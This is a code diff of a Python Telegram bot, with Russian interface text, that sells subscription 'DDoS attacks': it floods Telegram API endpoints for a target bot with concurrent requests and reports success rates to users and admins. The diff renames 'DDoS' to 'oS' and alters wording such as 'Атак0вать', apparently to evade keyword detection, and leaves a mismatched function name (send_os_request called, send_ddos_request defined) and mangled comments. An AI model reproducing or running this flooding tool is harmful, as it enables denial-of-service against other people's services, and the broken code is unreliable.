@@ -67,7 +67,7 @@ def init_db():
     conn.close()
 
 # === КЛАСС БОТА ===
-class AdvancedDDoSBot:
+class AdvancedoSBot:
     def __init__(self):
         self.active_attacks = {}
         self.user_cooldowns = {}
@@ -143,14 +143,14 @@ class AdvancedDDoSBot:
         self.update_user(user_id, username=username)
         
         keyboard = [
-            [InlineKeyboardButton("🎯 Атаковать бота", callback_data="start_attack")],
+            [InlineKeyboardButton("🎯 Атак0вать бота", callback_data="start_attack")],
             [InlineKeyboardButton("📊 Моя статистика", callback_data="my_stats")],
             [InlineKeyboardButton("👑 Админ панель", callback_data="admin_panel")],
             [InlineKeyboardButton("💎 Проверить подписку", callback_data="check_sub")]
         ]
         
         await update.message.reply_text(
-            "🤖 **Advanced DDoS Bot**\n\n"
+            "🤖 **Advanced oS Bot**\n\n"
             "Выберите действие:",
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
@@ -206,7 +206,7 @@ class AdvancedDDoSBot:
             return
             
         await query.edit_message_text(
-            "🎯 **Запуск DDoS атаки**\n\n"
+            "🎯 **Запуск oS атаки**\n\n"
             "Введите ID или username бота-цели:\n"
             "Пример: `123456789` или `@example_bot`\n\n"
             "⚠️ *Используйте только своих ботов для тестирования!*",
@@ -221,8 +221,8 @@ class AdvancedDDoSBot:
         text = update.message.text
         
         if user_id in context.user_data and context.user_data[user_id].get("waiting_for_target"):
-            # Пользователь вводит цель для атаки
-            await self.start_ddos_attack(update, context, text)
+            # Пользователь вводит
+            await self.start_os_attack(update, context, text)
         elif user_id in context.user_data and context.user_data[user_id].get("admin_broadcast"):
             # Админ делает рассылку
             await self.execute_broadcast(update, context, text)
@@ -245,7 +245,7 @@ class AdvancedDDoSBot:
             # Админ выдает админку
             await self.execute_give_admin(update, context, text)
 
-    async def start_ddos_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE, target_bot: str):
+    async def start_os_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE, target_bot: str):
         user_id = update.effective_user.id
         context.user_data[user_id] = {}  # Сбрасываем состояние
         
@@ -255,11 +255,11 @@ class AdvancedDDoSBot:
             await update.message.reply_text("❌ У вас нет активной подписки!")
             return
             
-        await update.message.reply_text(f"🎯 **Запуск DDoS атаки на {target_bot}**\n\nАтака начата...")
+        await update.message.reply_text(f"🎯 **Запуск oS атаки на {target_bot}**\n\nАтака начата...")
         
-        # Запускаем атаку в отдельном потоке
+        # Запускаем в отдельном потоке
         attack_id = f"{user_id}_{int(time.time())}"
-        attack_task = asyncio.create_task(self.execute_ddos_attack(user_id, target_bot, attack_id))
+        attack_task = asyncio.create_task(self.execute_os_attack(user_id, target_bot, attack_id))
         self.attack_tasks[attack_id] = attack_task
         
         # Сохраняем информацию об атаке в БД
@@ -272,7 +272,7 @@ class AdvancedDDoSBot:
         conn.commit()
         conn.close()
 
-    async def execute_ddos_attack(self, user_id: int, target_bot: str, attack_id: str):
+    async def execute_os_attack(self, user_id: int, target_bot: str, attack_id: str):
         start_time = time.time()
         total_requests = 0
         successful_requests = 0
@@ -282,7 +282,7 @@ class AdvancedDDoSBot:
                 while time.time() - start_time < ATTACK_DURATION:
                     tasks = []
                     for _ in range(REQUESTS_PER_SECOND):
-                        task = self.send_ddos_request(session, target_bot)
+                        task = self.send_os_request(session, target_bot)
                         tasks.append(task)
                     
                     results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -299,7 +299,7 @@ class AdvancedDDoSBot:
                     await asyncio.sleep(1)
                     
         except Exception as e:
-            print(f"DDoS attack error: {e}")
+            print(f"oS attack error: {e}")
         finally:
             success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
             
@@ -322,9 +322,9 @@ class AdvancedDDoSBot:
                 del self.attack_tasks[attack_id]
 
     async def send_ddos_request(self, session, target_bot):
-        """Отправляет DDoS запрос к боту"""
+        """Отправляет oS запрос к боту"""
         try:
-            # Разные методы атаки для максимальной эффективности
+            # Разные методы атаи для максимальной эффективности
             methods = [
                 f"https://api.telegram.org/bot{target_bot}/getMe",
                 f"https://api.telegram.org/bot{target_bot}/getUpdates",
@@ -341,7 +341,7 @@ class AdvancedDDoSBot:
             return {"success": False, "status": 0}
 
     async def send_progress_update(self, user_id: int, target_bot: str, total: int, successful: int):
-        """Отправляет обновление о прогрессе атаки"""
+        """Отправляет обновление о прогрессе атаи"""
         try:
             app = Application.builder().token(BOT_TOKEN).build()
             success_rate = (successful / total * 100) if total > 0 else 0
@@ -363,7 +363,7 @@ class AdvancedDDoSBot:
         <!DOCTYPE html>
         <html>
         <head>
-            <title>DDoS Attack Report</title>
+            <title>oS Attack Report</title>
             <style>
                 body {{ background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; }}
                 .container {{ max-width: 800px; margin: 0 auto; padding: 20px; }}
@@ -377,7 +377,7 @@ class AdvancedDDoSBot:
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>⚡ DDoS Attack Report</h1>
+                    <h1>⚡ oS Attack Report</h1>
                     <p>Generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                 </div>
                 
@@ -412,7 +412,7 @@ class AdvancedDDoSBot:
             # Отправляем пользователю
             await app.bot.send_message(
                 user_id,
-                f"📊 **DDoS Attack Completed**\n\n"
+                f"📊 **oS Attack Completed**\n\n"
                 f"Цель: `{escape(target_bot)}`\n"
                 f"Всего запросов: `{total}`\n"
                 f"Успешных: `{successful}`\n"
@@ -425,7 +425,7 @@ class AdvancedDDoSBot:
             for admin_id in ADMIN_IDS:
                 await app.bot.send_message(
                     admin_id,
-                    f"👑 **DDoS Report - Admin**\n\n"
+                    f"👑 **oS Report - Admin**\n\n"
                     f"Пользователь: `{user_id}`\n"
                     f"Цель: `{escape(target_bot)}`\n"
                     f"Запросов: `{total}`\n"
@@ -586,7 +586,7 @@ class AdvancedDDoSBot:
 
 # === ЗАПУСК БОТА ===
 async def main():
-    bot = AdvancedDDoSBot()
+    bot = AdvancedoSBot()
     
     application = Application.builder().token(BOT_TOKEN).build()
     
